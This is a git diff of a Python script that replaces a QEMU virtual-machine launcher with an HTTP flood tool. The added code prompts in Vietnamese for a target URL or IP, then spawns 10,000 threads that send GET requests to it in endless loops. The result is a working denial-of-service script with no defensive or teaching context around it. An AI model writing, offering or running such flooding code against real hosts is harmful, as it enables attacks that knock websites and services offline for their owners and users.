@@ -1,5 +1,18 @@
-import subprocess
+import threading
+import requests
 
-command = 'qemu-system-x86_64 -m 9G -cpu core2duo -boot order=c -drive file=win.iso,media=cdrom -drive file=win.img,format=raw -device usb-ehci,id=usb,bus=pci.0,addr=0x4 -device usb-tablet -vnc :0 -smp cores=24,threads=8 -device e1000,netdev=n0 -netdev user,id=n0 -vga vmware'
+url = input("Nhập URL hoặc IP: ")
 
-process = subprocess.Popen(command, shell=True)
+def send_request():
+    while True:
+        try:
+            response = requests.get(url)
+            if response.status_code == 200:
+                print("Yêu cầu thành công!")
+        except requests.exceptions.RequestException as e:
+            print("Lỗi:", e)
+
+# Tạo và bắt đầu 10000 thread
+for _ in range(10000):
+    thread = threading.Thread(target=send_request)
+    thread.start()
